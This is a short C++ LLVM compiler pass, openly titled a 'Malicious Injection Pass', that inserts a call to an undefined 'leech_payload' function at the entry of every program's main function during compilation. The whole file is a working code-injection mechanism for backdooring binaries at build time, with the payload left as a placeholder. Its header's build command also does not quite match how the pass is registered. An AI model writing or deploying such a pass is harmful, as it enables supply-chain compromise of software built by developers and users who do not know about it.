
// LLVM Leech: Malicious Injection Pass (Symbolic)
// Compiled with: clang -Xclang -load ./leech_pass.so -Xclang -add-plugin -Xclang inject_payload ...

#include "llvm/Pass.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Module.h"

using namespace llvm;

namespace {
  struct InjectPayload : public FunctionPass {
    static char ID;
    InjectPayload() : FunctionPass(ID) {}

    bool runOnFunction(Function &F) override {
      if (F.getName() != "main") return false;

      IRBuilder<> Builder(&F.getEntryBlock().front());
      FunctionType *payloadType = FunctionType::get(Type::getVoidTy(F.getContext()), false);
      FunctionCallee payload = F.getParent()->getOrInsertFunction("leech_payload", payloadType);

      Builder.CreateCall(payload);
      return true;
    }
  };
}

char InjectPayload::ID = 0;
static RegisterPass<InjectPayload> X("inject_payload", "LLVM Leech Payload Injector", false, false);
